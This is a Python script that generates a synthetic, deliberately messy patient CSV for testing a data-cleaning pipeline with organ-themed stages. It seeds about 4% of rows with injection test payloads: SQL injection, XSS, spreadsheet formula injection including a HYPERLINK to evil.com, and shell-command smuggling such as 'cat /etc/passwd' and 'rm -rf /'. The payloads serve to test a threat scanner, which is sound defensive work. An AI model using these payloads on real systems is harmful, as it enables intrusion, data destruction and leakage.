"""
Script to generate an expanded healthcare dataset (>1500 rows) with realistic
messy formatting, control characters / corrupted symbols to activate the Stomach acid,
and security injection threats to activate the Immune System threat scanner.
Does not overwrite any existing files.
"""
import random
import csv
import os

FIRST_NAMES = [
    "John", "Jane", "Alice", "Bob", "Mary", "Michael", "David", "Sarah",
    "James", "Emma", "Robert", "Olivia", "William", "Sophia", "Thomas", "Mia"
]

LAST_NAMES = [
    "Doe", "Johnson", "Smith", "Williams", "Brown", "Jones", "Miller", "Davis",
    "Wilson", "Taylor", "Anderson", "Thomas", "Jackson", "White", "Harris", "Martin"
]

GENDERS = ["MALE", "FEMALE", "male", "female", "M", "F", "m", "f", ""]
AGES = ["25", "30", "35", "40", "45", "50", "55", "60", "65", "forty", "fifty", "sixty", ""]
HEIGHTS = ["160", "165", "170", "175", "180", "170cm", "165cm", "one seventy", "one sixty five", ""]
WEIGHTS = ["60", "65", "70", "75", "80", "85", "90", "eighty", "eighty five", ""]
BLOOD_PRESSURES = ["120/80", "140/90", "110 over 70", "130-85", "90 by 70", "135/88", "125 over 82", ""]
DIABETES_VALS = ["Yes", "No", "YES", "nO", "Y", "N", ""]
SMOKER_VALS = ["No", "Yes", "NO", "nO", "Occasionally", "occasionally", ""]
DATES = ["2023.04.01", "15-02-2023", "2023/01/15", "March 5 2023", "2023-05-20", "2023-08-14", ""]
DIAGNOSES = ["Hypertension", "Diabetes Type II", "Asthma", "none", "Cardiovascular Disease", "Hyperlipidemia", ""]

# Security Injection Threat Payloads (Immune system triggers)
INJECTION_THREATS = [
    ("Name", "Robert'; DROP TABLE Patients;--"),
    ("Name", "<script>alert('XSS')</script>"),
    ("Name", "=cmd|' /C calc'!A0"),
    ("Patient ID", "PID9999' UNION SELECT * FROM users--"),
    ("Blood Pressure", "120/80; cat /etc/passwd"),
    ("Diagnosis", "Hypertension'; DROP TABLE Diagnoses;--"),
    ("Name", "Jane <img src=x onerror=alert(1)>"),
    ("Date of Visit", "2023-01-01 && whoami"),
    ("Name", "=HYPERLINK(\"http://evil.com/leak\")"),
    ("Patient ID", "PID8888' OR '1'='1"),
    ("Name", "Admin'; xp_cmdshell('dir');--"),
    ("Smoker", "Yes | rm -rf /")
]

# Corrupted Characters / Control Characters (Stomach Acid triggers)
DIRTY_SYMBOLS = [
    "\x00",            # Null byte
    "\x07\x08",        # Bell / backspace control chars
    "\ufeff",          # Byte order mark
    "\u200b\u200c",    # Zero-width spaces
    "\x01\x02\x03",    # SOH / STX / ETX non-printable control chars
    "\x1b[2J",         # ANSI escape sequences
    "\x0c"             # Form feed
]


def generate_dataset(num_rows: int = 1600, output_filename: str = "expanded_messy_health_data.csv"):
    header = [
        "Patient ID", "Name", "Gender", "Age", "Height_cm", "Weight_kg",
        "BMI", "Blood Pressure", "Diabetes", "Smoker", "Date of Visit", "Diagnosis"
    ]

    rows = []
    pid_counter = 1000

    for i in range(num_rows):
        pid_counter += 1
        pid = f"PID{pid_counter}"

        # Baseline random patient data
        fn = random.choice(FIRST_NAMES)
        ln = random.choice(LAST_NAMES)
        # Inconsistent casing
        case_choice = random.random()
        if case_choice < 0.25:
            name = f"{fn} {ln}".upper()
        elif case_choice < 0.50:
            name = f"{fn.lower()} {ln.lower()}"
        elif case_choice < 0.70:
            name = f"{fn.lower()}{ln.lower()}"
        else:
            name = f"{fn} {ln}"

        gender = random.choice(GENDERS)
        age = random.choice(AGES)
        height = random.choice(HEIGHTS)
        weight = random.choice(WEIGHTS)
        bmi = ""  # Raw BMI is empty, calculated by Liver/Intestine
        bp = random.choice(BLOOD_PRESSURES)
        diabetes = random.choice(DIABETES_VALS)
        smoker = random.choice(SMOKER_VALS)
        date_visit = random.choice(DATES)
        diag = random.choice(DIAGNOSES)

        row_dict = {
            "Patient ID": pid,
            "Name": name,
            "Gender": gender,
            "Age": age,
            "Height_cm": height,
            "Weight_kg": weight,
            "BMI": bmi,
            "Blood Pressure": bp,
            "Diabetes": diabetes,
            "Smoker": smoker,
            "Date of Visit": date_visit,
            "Diagnosis": diag
        }

        # 1. Inject Stomach Acid triggers (~18% of rows get null bytes, control characters, or zero-width symbols)
        if random.random() < 0.18:
            target_field = random.choice(["Name", "Height_cm", "Weight_kg", "Diagnosis", "Blood Pressure"])
            dirty_sym = random.choice(DIRTY_SYMBOLS)
            row_dict[target_field] = f"{dirty_sym}{row_dict[target_field]}{dirty_sym}"

        # 2. Inject Immune System Injection Threats (~4% of rows get real security injection payloads)
        if random.random() < 0.04:
            threat_field, threat_payload = random.choice(INJECTION_THREATS)
            row_dict[threat_field] = threat_payload

        # 3. Inject Missing High Priority fields to trigger Quarantine Tribunal (~5% of rows)
        if random.random() < 0.05:
            # Drop Name or Patient ID
            if random.random() < 0.5:
                row_dict["Name"] = ""
            else:
                row_dict["Patient ID"] = ""

        # 4. Inject Duplicates (~3% of rows)
        if rows and random.random() < 0.03:
            duplicate_row = dict(random.choice(rows[-50:]))
            rows.append(duplicate_row)
        else:
            rows.append(row_dict)

    # Write out to new file
    output_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), output_filename)
    with open(output_path, "w", newline="", encoding="utf-8") as f:
        writer = csv.DictWriter(f, fieldnames=header)
        writer.writeheader()
        for r in rows:
            writer.writerow(r)

    print(f"Successfully generated expanded dataset with {len(rows)} records at: {output_path}")
    print(f"File size: {os.path.getsize(output_path) / 1024:.2f} KB")


if __name__ == "__main__":
    generate_dataset(num_rows=1600, output_filename="expanded_messy_health_data.csv")

